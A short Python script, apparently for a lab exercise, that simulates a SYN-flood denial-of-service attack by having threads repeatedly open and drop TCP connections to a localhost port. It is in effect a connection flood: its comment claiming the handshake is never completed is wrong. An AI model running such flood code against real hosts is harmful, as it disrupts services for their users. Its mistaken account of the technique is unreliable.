import socket
import threading
import random
import time

TARGET_IP = "127.0.0.1"
TARGET_PORT = 12345  
NUM_THREADS = 10  # To simulate DDoS, reduce for debugging

def syn_flood(thread_id):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

            # Random source port to more accurately simulate (D)DoS
            src_port = random.randint(5000, 65535) # this range chosen because lower port numbers are usually reserved for other processes
            s.bind(("127.0.0.1", src_port))
            print(f"[Thread {thread_id}] Using source port: {src_port}")

            # Attempt to connect (SYN sent)
            print(f"[Thread {thread_id}] Sending SYN to {TARGET_IP}:{TARGET_PORT} from port {src_port}")
            result = s.connect_ex((TARGET_IP, TARGET_PORT))

            if result == 0:
                print(f"[Thread {thread_id}] Connection successful")
            else:
                print(f"[Thread {thread_id}] Connection failed with error code: {result}")

            # Close the socket without completing the handshake
            s.close()
            print(f"[Thread {thread_id}] Connection closed prematurely (SYN flood behavior)")

            # sleep is to avoid overwhelming the OS
            time.sleep(0.1)
        except Exception as e:
            print(f"[Thread {thread_id}] Connection failed: {e}")

# Launch multiple threads to simulate a SYN flood (DDoS)
threads = []
for i in range(NUM_THREADS):
    print(f"[Main] Starting thread {i}")
    thread = threading.Thread(target=syn_flood, args=(i,), daemon=True)
    threads.append(thread)
    thread.start()

# Keep the script running
while True:
    pass
